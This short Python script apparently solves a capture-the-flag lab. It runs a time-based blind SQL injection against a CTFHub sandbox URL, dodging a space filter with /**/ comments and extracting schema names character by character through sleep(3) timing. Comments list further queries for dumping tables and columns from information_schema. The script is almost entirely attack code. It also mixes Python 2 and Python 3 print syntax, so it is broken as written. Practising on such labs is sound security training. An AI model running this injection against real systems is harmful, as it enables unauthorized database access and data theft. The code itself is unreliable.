#! python2
# select/**/group_concat(schema_name)/**/from/**/information_schema.schemata
# select group_concat(table_name) from information_schema.columns where schema_name='sqli'
# select group_concat(column_name) from information_schema.columns where table_name=''
# select/**/yfskguzube/**/from/**/sqli.cfzcjsywsx
import requests as re
name=""
chk=0
for i in xrange(1,50):
	chk+=1
	for j in range(32,126):
		url='http://challenge-6bd43b23c8d5e07a.sandbox.ctfhub.com:10080?id=1/**/and/**/if(ascii(substr('+'(select/**/group_concat(schema_name)/**/from/**/information_schema.schemata'+'/**/limit/**/0,1),'+str(i)+',1))='+str(j)+',sleep(3),1)'
		time=re.get(url)
		if time.elapsed.total_seconds() >3 :
			print(chr(j),end='')
			name=name+chr(j)
			chk=0
			break
	if chk==1:
		break
print name